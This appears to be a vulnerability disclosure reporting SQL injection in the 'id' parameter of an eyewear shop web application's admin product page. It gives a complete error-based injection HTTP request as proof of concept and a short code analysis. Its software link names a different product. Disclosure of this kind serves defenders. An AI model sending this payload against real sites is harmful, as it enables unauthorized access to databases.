## Affected version: 
Online Eyewear Shop Website - 1.0

## Vendor:
https://www.sourcecodester.com/users/tips23

## Software:
https://www.sourcecodester.com/search?q=AC+Repair+and+Services+System

## Vulnerability File:
/oews/admin/?page=products/manage_product

## Description:
Online Eyewear Shop Website 1.0 is vulnerable to unrestricted SQL injection attacks via /oews/admin/?page=products/manage_product, the controllable parameter is: id. This function brings the id parameter into the SQL statement for execution without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

Status: CRITICAL

POC
```
GET /oews/admin/?page=products/manage_product&id=1%27%20and%20updatexml(1,concat(0x7e,(database())),3)--%20q HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=32cto35al185bgmn489u9arakg; __insuarance__logged=1; __insuarance__key=PO3ZYU67VV15JHRDZ5SJ
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
X-Forwarded-For: 192.168.1.23
Priority: u=1
```
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/59ba8557-1ca9-4642-8bc7-a9efa0e03df1)

## code analysis:

The $id parameter in the manage_product.php file is controllable and can be directly brought into the database to execute SQL statements.

![image](https://github.com/Hefei-Coffee/cve/assets/168982375/40f17833-6626-48d8-868b-b7a4c1092018)


